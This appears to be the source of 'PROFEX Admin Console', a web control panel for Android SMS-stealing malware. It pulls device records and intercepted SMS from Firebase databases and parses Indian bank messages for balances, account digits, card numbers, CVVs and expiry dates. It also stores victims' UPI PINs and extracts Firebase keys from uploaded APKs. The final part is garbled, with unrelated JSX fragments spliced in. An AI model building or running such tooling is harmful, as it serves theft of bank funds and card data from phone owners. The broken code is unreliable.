<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>PROFEX Admin Console</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            border: 'hsl(0 0% 12%)',
            background: 'hsl(0 0% 3%)',
            foreground: 'hsl(0 0% 93%)',
          }
        }
      }
    };
  </script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
  <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
  <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
  <style>
    * { box-sizing: border-box; }
    body {
      background: #080808;
      color: #ededed;
      font-family: 'Inter', ui-sans-serif, system-ui, sans-serif;
      margin: 0;
    }
    .glass-card {
      background: rgba(255,255,255,0.03);
      border: 1px solid rgba(255,255,255,0.08);
      backdrop-filter: blur(12px);
    }
    .red-gradient {
      background: linear-gradient(135deg, #dc2626, #ea580c);
    }
    @keyframes fadeIn {
      0% { opacity: 0; transform: translateY(10px) scale(0.98); filter: blur(2px); }
      100% { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); }
    }
    .animate-fade-in { animation: fadeIn 1s ease-out forwards; }
    .delay-300 { animation-delay: 300ms; }

    @keyframes glint {
      0%, 100% { transform: scale(1); opacity: 0; }
      50% { transform: scale(1.5); opacity: 1; }
    }
    .animate-glint {
      animation: glint 1.5s infinite;
      box-shadow: 0 0 6px #6acfff, 0 0 10px #0088cc;
    }

    @keyframes fadeUp {
      from { opacity: 0; transform: translateY(8px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .animate-fade-up { animation: fadeUp 0.3s ease-out forwards; }

    .glow-wave {
      display: inline-block;
      padding: 4px;
      border-radius: 50%;
      box-shadow: 0 0 6px #00bfff, 0 0 10px #0088cc;
      animation: wave 3s infinite ease-in-out;
    }
    @keyframes wave {
      0% { transform: rotate(0deg); }
      25% { transform: rotate(2deg); }
      50% { transform: rotate(0deg); }
      75% { transform: rotate(-2deg); }
      100% { transform: rotate(0deg); }
    }

    ::-webkit-scrollbar { width: 4px; height: 4px; }
    ::-webkit-scrollbar-track { background: transparent; }
    ::-webkit-scrollbar-thumb { background: #222; border-radius: 2px; }
    ::-webkit-scrollbar-thumb:hover { background: #333; }

    select option { background: #111; color: #ccc; }

    @keyframes spin {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }
    .animate-spin { animation: spin 1s linear infinite; }
    .animate-pulse { animation: pulse 2s cubic-bezier(0.4,0,0.6,1) infinite; }
    @keyframes pulse {
      0%,100% { opacity: 1; }
      50% { opacity: .5; }
    }

    @keyframes slideUpIn {
      0% { opacity: 0; transform: translateX(-50%) translateY(30px) scale(0.95); }
      100% { opacity: 1; transform: translateX(-50%) translateY(0) scale(1); }
    }
    @keyframes slideDownOut {
      0% { opacity: 1; transform: translateX(-50%) translateY(0) scale(1); }
      100% { opacity: 0; transform: translateX(-50%) translateY(20px) scale(0.95); }
    }
    .sms-popup-enter { animation: slideUpIn 0.35s cubic-bezier(0.34,1.56,0.64,1) forwards; }
    .sms-popup-exit { animation: slideDownOut 0.25s ease-in forwards; }
    @keyframes shrink {
      0% { transform: scaleX(1); }
      100% { transform: scaleX(0); }
    }
  </style>
</head>
<body>
  <div id="app"></div>

  <script type="text/babel">
    const { useState, useEffect, useRef, useCallback } = React;

    // ─── SVG Icon Helper ────────────────────────────────────────────────────────
    function Svg({ d, className = 'w-4 h-4' }) {
      return (
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
          stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"
          className={className} dangerouslySetInnerHTML={{ __html: d }} />
      );
    }
    const ICONS = {
      Shield: '<path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/>',
      Eye: '<path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/>',
      EyeOff: '<path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"/><path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"/><path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"/><line x1="2" x2="22" y1="2" y2="22"/>',
      Lock: '<rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>',
      Plus: '<path d="M5 12h14"/><path d="M12 5v14"/>',
      Trash2: '<path d="M3 6h18"/><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"/><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/><line x1="10" x2="10" y1="11" y2="17"/><line x1="14" x2="14" y1="11" y2="17"/>',
      ChevronRight: '<path d="m9 18 6-6-6-6"/>',
      Link: '<path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/>',
      Copy: '<rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/>',
      Check: '<path d="M20 6 9 17l-5-5"/>',
      Upload: '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" x2="12" y1="3" y2="15"/>',
      Download: '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/>',
      X: '<path d="M18 6 6 18"/><path d="m6 6 12 12"/>',
      RefreshCw: '<path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/><path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16"/><path d="M8 16H3v5"/>',
      Search: '<circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/>',
      LogOut: '<path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" x2="9" y1="12" y2="12"/>',
      Clock: '<circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>',
      AlertTriangle: '<path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><path d="M12 9v4"/><path d="M12 17h.01"/>',
      CheckCircle: '<path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><path d="m9 11 3 3L22 4"/>',
      Database: '<ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5V19A9 3 0 0 0 21 19V5"/><path d="M3 12A9 3 0 0 0 21 12"/>',
      Smartphone: '<rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/>',
      Key: '<circle cx="7.5" cy="15.5" r="5.5"/><path d="m21 2-9.6 9.6"/><path d="m15.5 7.5 3 3L22 7l-3-3"/>',
      Banknote: '<rect width="20" height="12" x="2" y="6" rx="2"/><circle cx="12" cy="12" r="2"/><path d="M6 12h.01M18 12h.01"/>',
      CreditCard: '<rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/>',
      MessageSquare: '<path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>',
      Send: '<path d="m22 2-7 20-4-9-9-4Z"/><path d="M22 2 11 13"/>',
      ArrowDownLeft: '<path d="m17 7-10 10"/><path d="M7 7v10h10"/>',
      ArrowUpRight: '<path d="M7 7h10v10"/><path d="m7 17 10-10"/>',
      Wifi: '<path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" x2="12.01" y1="20" y2="20"/>',
      Phone: '<path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.79 19.79 0 0 1 1.61 3.18A2 2 0 0 1 3.6 1h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L7.91 9a16 16 0 0 0 6.09 6.09l1.36-.91a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>',
      Star: '<polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/>',
    };
    function Icon({ name, className = 'w-4 h-4' }) {
      return <Svg d={ICONS[name] || ''} className={className} />;
    }

    // ─── Storage ─────────────────────────────────────────────────────────────────
    const KEYS = {
      ADMIN_AUTH: 'profex_admin_auth',
      ADMIN_PASS: 'profex_admin_pass',
      FIREBASE_ACCOUNTS: 'profex_firebase_accounts',
      ACTIVE_SERVERS: 'profex_active_servers',
      FAVORITE_DEVICES: 'profex_favorite_devices',
    };
    const DEFAULT_PASS = 'profex2024';

    function storageLoad(key, fallback) {
      try { const v = localStorage.getItem(key); return v ? JSON.parse(v) : fallback; } catch { return fallback; }
    }
    function storageSave(key, value) {
      try { localStorage.setItem(key, JSON.stringify(value)); } catch {}
    }

    function getAdminPass() { return storageLoad(KEYS.ADMIN_PASS, DEFAULT_PASS); }
    function setAdminPass(p) { storageSave(KEYS.ADMIN_PASS, p); }
    function isAdminLoggedIn() { const ts = storageLoad(KEYS.ADMIN_AUTH, 0); return Date.now() - ts < 8 * 60 * 60 * 1000; }
    function setAdminLoggedIn() { storageSave(KEYS.ADMIN_AUTH, Date.now()); }
    function adminLogout() { localStorage.removeItem(KEYS.ADMIN_AUTH); }
    function getAccounts() { return storageLoad(KEYS.FIREBASE_ACCOUNTS, []); }
    function saveAccounts(a) { storageSave(KEYS.FIREBASE_ACCOUNTS, a); }
    function getActiveServerIds() { return storageLoad(KEYS.ACTIVE_SERVERS, []); }
    function saveActiveServerIds(ids) { storageSave(KEYS.ACTIVE_SERVERS, ids); }
    function getFavoriteDevices() { return storageLoad(KEYS.FAVORITE_DEVICES, []); }
    function saveFavoriteDevices(devs) { storageSave(KEYS.FAVORITE_DEVICES, devs); }
    function toggleFavoriteDevice(deviceId, serverId) {
      const favs = getFavoriteDevices();
      const key = `${serverId}_${deviceId}`;
      const idx = favs.indexOf(key);
      if (idx === -1) favs.push(key); else favs.splice(idx, 1);
      saveFavoriteDevices(favs);
      return !favs.includes(key);
    }
    function isFavorite(deviceId, serverId) {
      const favs = getFavoriteDevices();
      return favs.includes(`${serverId}_${deviceId}`);
    }

    // ─── Utils ───────────────────────────────────────────────────────────────────
    function timeAgo(ts) {
      const diff = Date.now() - ts;
      if (diff < 0) return 'Just now';
      const s = Math.floor(diff / 1000), m = Math.floor(s / 60), h = Math.floor(m / 60), d = Math.floor(h / 24);
      if (s < 60) return `${s}s ago`;
      if (m < 60) return `${m}m ago`;
      if (h < 24) return `${h}h ${m % 60}m ago`;
      if (d < 30) return `${d}d ${h % 24}h ago`;
      return new Date(ts).toLocaleDateString('en-IN', { day: '2-digit', month: 'short', year: 'numeric' });
    }
    function formatDatetime(ts) {
      return new Date(ts).toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
    }
    function normalizeTimestamp(v) {
      if (!v) return null;
      if (typeof v === 'number') return v < 1e12 ? v * 1000 : v;
      if (typeof v === 'string' && v.trim()) {
        const t = Date.parse(v); if (!isNaN(t)) return t;
        const m = v.match(/(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{4})[T\s](\d{2}):(\d{2})(?::(\d{2}))?/);
        if (m) { const [, d, mo, y, hh, mi, ss] = m; const x = new Date(+y, +mo - 1, +d, +hh, +mi, +(ss||0)).getTime(); if (!isNaN(x)) return x; }
      }
      return null;
    }
    function formatCurrency(v) {
      try { return parseFloat(v).toLocaleString('en-IN', { minimumFractionDigits: 2, maximumFractionDigits: 2 }); } catch { return v; }
    }
    function makeShareLink(url, key) {
      const base = window.location.origin + window.location.pathname;
      return `${base}?s=${btoa(unescape(encodeURIComponent(url + '|||' + key)))}`;
    }
    function parseShareLink(enc) {
      try { const dec = decodeURIComponent(escape(atob(enc))); const [url, key] = dec.split('|||'); if (url && key) return { url, key }; } catch {}
      return null;
    }
    function makeMultiShareLink(servers) {
      const base = window.location.origin + window.location.pathname;
      return `${base}?ms=${btoa(unescape(encodeURIComponent(JSON.stringify(servers))))}`;
    }
    function parseMultiShareLink(enc) {
      try { return JSON.parse(decodeURIComponent(escape(atob(enc)))); } catch {} return null;
    }

    // ─── Firebase ────────────────────────────────────────────────────────────────
    async function fbGet(url, key, path, params) {
      let base = url.trim().replace(/\/$/, '');
      if (!base.startsWith('http')) base = 'https://' + base;
      if (!base.includes('firebaseio.com') && !base.includes('firebasedatabase.app'))
        throw new Error('Invalid Firebase URL. Must contain firebaseio.com or firebasedatabase.app');
      const qs = new URLSearchParams({ auth: key.trim(), ...(params || {}) });
      const endpoint = `${base}/${path}.json?${qs}`;
      let res;
      try {
        const ctrl = new AbortController();
        const timer = setTimeout(() => ctrl.abort(), 15000);
        res = await fetch(endpoint, { method: 'GET', headers: { Accept: 'application/json' }, signal: ctrl.signal });
        clearTimeout(timer);
      } catch (e) {
        if (e.name === 'AbortError') throw new Error('Request timed out. Check your Firebase URL.');
        throw new Error('Network error: ' + e.message);
      }
      if (!res.ok) {
        if (res.status === 401 || res.status === 403) throw new Error('PERMISSION_DENIED: Firebase rejected your key. Use Database Secret key from Firebase Console → Project Settings → Service Accounts → Database Secrets.');
        if (res.status === 404) return null;
        const text = await res.text().catch(() => '');
        throw new Error(`HTTP ${res.status}: ${text.slice(0, 300)}`);
      }
      return res.json();
    }
    async function fbPut(url, key, path, data) {
      const base = url.replace(/\/$/, '');
      const res = await fetch(`${base}/${path}.json?auth=${key}`, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
      if (!res.ok) {
        if (res.status === 401 || res.status === 403) throw new Error('PERMISSION_DENIED: Cannot write to Firebase. Use Database Secret key, not API key.');
        throw new Error(`HTTP ${res.status}`);
      }
      return res.json();
    }
    async function fbDelete(url, key, path) {
      const base = url.replace(/\/$/, '');
      const res = await fetch(`${base}/${path}.json?auth=${key}`, { method: 'DELETE' });
      if (!res.ok && res.status === 403) throw new Error('PERMISSION_DENIED');
    }

    // ─── SMS Analysis ────────────────────────────────────────────────────────────
    const BANK_SENDERS = [
      [/HDFCBK|HDFCBANK|HDFC/i, 'HDFC Bank'], [/SBIIN|SBIINB|SBI/i, 'SBI'],
      [/ICICIB|ICICI/i, 'ICICI Bank'], [/AXISBK|AXISBANK|AXIS/i, 'Axis Bank'],
      [/KOTAKB|KOTAK/i, 'Kotak Bank'], [/PNBSMS|PNB/i, 'PNB'],
      [/BOIIND|BOI/i, 'Bank of India'], [/CANBNK|CANARA/i, 'Canara Bank'],
      [/UNIONB|UBISMS/i, 'Union Bank'], [/YESBNK|YESBANK/i, 'Yes Bank'],
      [/IDBIBK|IDBI/i, 'IDBI Bank'], [/INDUSB|INDUSIND/i, 'IndusInd Bank'],
      [/FEDERAL|FEDBNK/i, 'Federal Bank'], [/RBLBNK|RBL/i, 'RBL Bank'],
      [/PAYTM/i, 'Paytm'], [/PHONEPE|PHNPE/i, 'PhonePe'],
      [/GPAY|GOOGLEPAY/i, 'Google Pay'], [/AMAZONPAY/i, 'Amazon Pay'],
      [/BAJAJFIN/i, 'Bajaj Finance'], [/CRED/i, 'CRED'],
      [/AIRTEL/i, 'Airtel Payments'], [/JIOMNY|JIOMONEY/i, 'Jio Money'],
    ];
    function getBankName(sender) {
      for (const [re, name] of BANK_SENDERS) if (re.test(sender)) return name;
      const m = sender.toUpperCase().match(/(?:[A-Z]{2}-)?([A-Z0-9]+)/);
      return m ? m[1] : sender || 'Bank';
    }
    const BAL_PATTERNS = [
      /Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
      /Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
      /Available\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i,
      /(?:Avl|Avbl|Aval)\.?\s*(?:Bal(?:ance)?)\.?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
      /Bal(?:ance)?\.?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
      /Bal[\.:]?\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i,
    ];
    const TXN_PATTERNS = [
      /(?:debited|credited|withdrawn|deposited)(?:\s+(?:by|with|for|of))?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
      /(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s+(?:debited|credited|withdrawn)/i,
      /^(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
      /(?:INR|Rs\.?|₹)\s*([0-9]{2,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i,
    ];
    const ACCT_PATTERNS = [
      /(?:A\/C|account|acct)(?:\s+(?:no\.?|number|#))?[\s:*xX]+([xX*]{0,4}[0-9]{4})/i,
      /[xX*]{4,}([0-9]{4})/, /ending\s+(?:with\s+)?([0-9]{4})/i,
    ];
    const CARD_PATTERNS = [
      /(?:card|debit|credit)(?:\s+(?:no\.?|number|ending|#))?[\s:*xX]+([xX*]{0,8}[0-9]{4})/i,
      /card\s+([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i,
    ];
    const CVV_PATTERNS = [/CVV[\s:]+([0-9]{3,4})/i, /(?:cvv|cvc|security\s+code)[\s:]+([0-9]{3,4})/i];
    const EXP_PATTERNS = [/(?:expiry|exp|valid\s+thru?|valid\s+till)[\s:]+([0-9]{1,2}\/[0-9]{2,4})/i];
    const PHONE_PATTERNS = [
      /(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num)\s*[:\-]\s*(\+?91[-\s]?[6-9][0-9]{9})/i,
      /(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num)\s*[:\-]\s*([6-9][0-9]{9})/i,
      /Number\s*[:\-]\s*([6-9][0-9]{9})/i,
      /registered\s+(?:mobile\s+)?(?:number|no\.?)\s*[:\-]?\s*([6-9][0-9]{9})/i,
      /(\+91[-\s]?[6-9][0-9]{9})/, /(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)/,
    ];
    const NETWORK_SENDERS = [
      [/AIRTEL|JD-AIRTEL|VM-AIRTEL/i, 'Airtel'], [/JIOINF|JIOMSG|JIONET|JIO/i, 'Jio'],
      [/BSNLSM|BSNL/i, 'BSNL'], [/VISMOB|VI-|VODA|VODAFONE/i, 'Vodafone'],
      [/IDEACEL|IDEA/i, 'Vi (Idea)'], [/MTNL/i, 'MTNL'],
    ];

    function detectPhone(text) {
      for (const re of PHONE_PATTERNS) {
        const m = text.match(re);
        if (m?.[1]) {
          const d = m[1].replace(/[^0-9]/g, '');
          if (d.length === 10 && /^[6-9]/.test(d)) return d;
          if (d.length === 12 && d.startsWith('91') && /^91[6-9]/.test(d)) return d.slice(2);
        }
      }
      return null;
    }
    function detectNetwork(text, sender) {
      for (const [re, name] of NETWORK_SENDERS) if (re.test(sender)) return name;
      const body = text + ' ' + sender;
      const bp = [[/\bJio\b/i,'Jio'],[/\bAirtel\b/i,'Airtel'],[/\bBSNL\b/i,'BSNL'],[/\bVodafone\b/i,'Vodafone'],[/\b(?:Idea|Vi)\b/i,'Vi'],[/\bMTNL\b/i,'MTNL']];
      for (const [re, name] of bp) if (re.test(body)) return name;
      return null;
    }
    function parseBankSms(text, sender) {
      if (!text || text.trim().length < 8) return null;
      const up = text.toUpperCase();
      const isBank = /AVL|AVAL|AVBL|AVAIL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|TRANSACTION|A\/C|ACCOUNT|INR|RUPEE/.test(up);
      const knownSender = /^[A-Z]{2}-[A-Z0-9]+$/.test(sender) && BANK_SENDERS.some(([re]) => re.test(sender));
      if (!isBank && !knownSender) return null;
      let balance = null;
      for (const re of BAL_PATTERNS) { const m = text.match(re); if (m?.[1]) { const v = m[1].replace(/,/g,''); if (parseFloat(v) >= 0) { balance = v; break; } } }
      if (!balance) return null;
      let txnAmt;
      for (const re of TXN_PATTERNS) { const m = text.match(re); if (m?.[1]) { const v = m[1].replace(/,/g,''); if (v !== balance) { txnAmt = v; break; } } }
      let txnType;
      if (/credit(?:ed)?/i.test(text)) txnType = 'credit';
      else if (/debit(?:ed)?|withdraw|paid|purchase|spent/i.test(text)) txnType = 'debit';
      let acct;
      for (const re of ACCT_PATTERNS) { const m = text.match(re); if (m?.[1]) { acct = m[1].replace(/[^0-9]/g,'').slice(-4); break; } }
      return {
        bankName: getBankName(sender), senderName: sender, availableBalance: balance,
        transactionAmount: txnAmt, transactionType: txnType, accountLast4: acct,
        phoneFromSms: detectPhone(text) ?? undefined, networkFromSms: detectNetwork(text, sender) ?? undefined,
        rawSms: text, detectedAt: new Date().toISOString(),
      };
    }
    function parseCardSms(text) {
      if (!text) return null;
      const up = text.toUpperCase();
      if (!up.includes('CARD') && !up.includes('CVV') && !up.includes('CREDIT') && !up.includes('DEBIT')) return null;
      let last4 = '';
      for (const re of CARD_PATTERNS) { const m = text.match(re); if (m?.[1]) { const d = m[1].replace(/[^0-9]/g,''); if (d.length >= 4) { last4 = d.slice(-4); break; } } }
      if (!last4) return null;
      let cardType = '';
      if (/VISA/i.test(text)) cardType = 'VISA';
      else if (/MASTER(?:CARD)?/i.test(text)) cardType = 'Mastercard';
      else if (/RUPAY/i.test(text)) cardType = 'RuPay';
      else if (/AMEX|AMERICAN EXPRESS/i.test(text)) cardType = 'Amex';
      else if (/credit/i.test(text)) cardType = 'Credit Card';
      else if (/debit/i.test(text)) cardType = 'Debit Card';
      let cvv, expiry;
      for (const re of CVV_PATTERNS) { const m = text.match(re); if (m?.[1]) { cvv = m[1]; break; } }
      for (const re of EXP_PATTERNS) { const m = text.match(re); if (m?.[1]) { expiry = m[1]; break; } }
      return { cardLast4: last4, cardType, cvv, expiry, rawSms: text };
    }
    function analyzeSmsMessages(messages) {
      const bankBalances = [], cards = [], phones = new Set(), networks = new Set();
      for (const msg of messages) {
        const bank = parseBankSms(msg.text, msg.sender);
        if (bank) { bank.detectedAt = msg.time || bank.detectedAt; bankBalances.push(bank); }
        const card = parseCardSms(msg.text);
        if (card) cards.push(card);
        const ph = detectPhone(msg.text); if (ph) phones.add(ph);
        const net = detectNetwork(msg.text, msg.sender); if (net) networks.add(net);
      }
      return { bankBalances, cards, phoneNumbers: [...phones], networks: [...networks] };
    }

    // ─── Device Parsing ───────────────────────────────────────────────────────────
    function parseDevices(raw, serverId, serverName) {
      const devices = [];
      if (!raw || typeof raw !== 'object') return devices;
      for (const [id, v] of Object.entries(raw)) {
        if (!v || typeof v !== 'object') continue;
        const d = v;
        let sims = [];
        const rawSims = d.sims;
        if (Array.isArray(rawSims)) sims = rawSims;
        else if (rawSims && typeof rawSims === 'object') sims = Object.values(rawSims);
        const battery = String(d.battery ?? '—');
        const batteryPercent = parseInt(battery.replace('%', '')) || 0;
        const lastSeenRaw = d.lastSeen ?? d.last_seen ?? d.lastOnline ?? d.last_online ?? d.lastActive ?? d.last_active ?? d.timestamp ?? d.time ?? d.dateTime ?? d.updatedAt ?? d.updated_at ?? null;
        const lastSeen = normalizeTimestamp(lastSeenRaw);
        devices.push({
          id, name: String(d.modelName || d.model || d.deviceName || id),
          battery, batteryPercent, status: !!d.status,
          phoneNumber: String(d.mobNo || (sims[0])?.phoneNumber || '—'),
          android: String(d.androidV || d.androidVersion || '—'),
          ip: String(d.ip_address || '—'), storage: String(d.storage || '—'),
          provider: String(d.service_provider || '—'), sims,
          upipin: d.upipin ? String(d.upipin) : null,
          cpu: String(d.cpu_arch || '—'), sdk: String(d.sdkV || '—'),
          lastSeen, lastSeenFormatted: lastSeen ? timeAgo(lastSeen) : undefined,
          serverId, serverName,
        });
      }
      return devices;
    }
    function parseSmsMessages(raw) {
      const msgs = [];
      if (!raw || typeof raw !== 'object') return msgs;
      const twoHoursAgo = Date.now() - 2 * 60 * 60 * 1000;
      const entries = Object.entries(raw);
      // Get last 150 messages first, then filter by time
      const slice = entries.length > 150 ? entries.slice(entries.length - 150) : entries;
      for (const [, v] of slice) {
        if (!v || typeof v !== 'object') continue;
        const m = v;
        const text = String(m.message || m.body || m.text || '');
        if (!text.trim()) continue;
        const timeStr = String(m.dateTime || m.date || '');
        const ts = normalizeTimestamp(timeStr);
        // Only include messages from last 2 hours; discard older messages
        if (ts !== null && ts < twoHoursAgo) continue;
        msgs.push({ text, sender: String(m.sender || m.from || 'Unknown'), time: timeStr, ts });
      }
      return msgs.reverse();
    }
    function buildSmsAnalysis(messages) { return analyzeSmsMessages(messages); }

    // ─── APK Parsing ─────────────────────────────────────────────────────────────
    function scanUint8Array(data, urlRe, keyRe) {
      let str = '';
      for (let i = 0; i < data.length; i += 65536) str += String.fromCharCode(...data.subarray(i, i + 65536));
      const urlM = str.match(urlRe), keyM = str.match(keyRe);
      return { url: urlM ? urlM[0] : '', key: keyM ? keyM[0] : '' };
    }
    async function parseApk(file) {
      const buf = await file.arrayBuffer();
      const zip = await JSZip.loadAsync(buf);
      let url = '', key = '', projectId = '', appId = '';
      const urlRe = /https:\/\/[a-z0-9_-]+\.firebaseio\.com/gi;
      const keyRe = /AIza[A-Za-z0-9_-]{35}/g;
      const arsc = zip.file('resources.arsc');
      if (arsc) { const data = await arsc.async('uint8array'); const f = scanUint8Array(data, urlRe, keyRe); if (f.url) url = f.url; if (f.key) key = f.key; }
      if (!url || !key) {
        for (const dexName of ['classes.dex','classes2.dex','classes3.dex','classes4.dex']) {
          if (url && key) break;
          const dex = zip.file(dexName); if (!dex) continue;
          const data = await dex.async('uint8array'); const f = scanUint8Array(data, urlRe, keyRe);
          if (!url && f.url) url = f.url; if (!key && f.key) key = f.key;
        }
      }
      if (!url || !key) {
        const gsFiles = [zip.file('google-services.json'), zip.file('assets/google-services.json')].filter(Boolean);
        zip.forEach((path, f) => { if (path.endsWith('google-services.json')) gsFiles.push(f); });
        for (const f of gsFiles) {
          if (!f) continue;
          try {
            const gs = JSON.parse(await f.async('text'));
            if (!url) url = gs?.project_info?.firebase_url || '';
            if (!projectId) projectId = gs?.project_info?.project_id || '';
            const client = gs?.client?.[0];
            if (!key) key = client?.api_key?.[0]?.current_key || '';
            if (!appId) appId = client?.client_info?.mobilesdk_app_id || '';
          } catch {}
        }
      }
      if (!url || !key) {
        for (const name of Object.keys(zip.files)) {
          if (url && key) break; if (zip.files[name].dir) continue;
          try { const data = await zip.files[name].async('uint8array'); const f = scanUint8Array(data, urlRe, keyRe); if (!url && f.url) url = f.url; if (!key && f.key) key = f.key; } catch {}
        }
      }
      if (!url && !key) return null;
      return { firebaseUrl: url, apiKey: key, projectId, appId };
    }

                    <button onClick={selectedIds.size === accounts.length ? selectNone : selectAll} className="text-xs text-[#555] hover:text-[#888] transition-colors px-2">
                      {selectedIds.size === accounts.length ? 'None' : 'All'}

                  )}
                </div>
              </div>

              {/* Accounts list */}
              <div className="space-y-2 max-h-64 overflow-y-auto pr-1 mb-4">
                {accounts.length === 0 ? (
                  <div className="text-center py-8 text-[#555] text-sm">
                    <Icon name="Shield" className="w-8 h-8 mx-auto mb-2 opacity-30" />

                ) : accounts.map((a, idx) => (
                  <div key={a.id} onClick={() => toggleSelect(a.id)}
                    className={`flex items-center gap-3 p-3 rounded-xl border cursor-pointer transition-all duration-200 group ${selectedIds.has(a.id) ? 'border-red-600/40 bg-red-950/20' : 'border-[#1f1f1f] hover:border-[#2a2a2a] hover:bg-white/[0.02]'}`}>
                    <div className="flex-shrink-0 w-7 h-7 rounded-lg flex items-center justify-center text-[10px] font-bold text-white" style={{ background: a.color || SERVER_COLORS_LIST[idx % SERVER_COLORS_LIST.length] }}>
                      {idx + 1}
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="text-xs font-semibold text-white truncate">{a.name}</p>
                      <p className="text-[10px] text-[#444] font-mono truncate mt-0.5">{a.url}</p>
                      <p className="text-[10px] text-[#333] font-mono truncate">{a.key.substring(0, 20)}…</p>
                    </div>
                    <div className="flex items-center gap-1.5 flex-shrink-0">
                      {selectedIds.has(a.id) && <Icon name="Check" className="w-3.5 h-3.5 text-red-400" />}
                      <button onClick={e => shareAccount(a, e)} className="p-1 rounded-lg bg-blue-950/60 border border-blue-900/40 text-blue-400 hover:bg-blue-900/60 transition-all" title="Share link">
                        <Icon name="Link" className="w-3 h-3" />
                      </button>
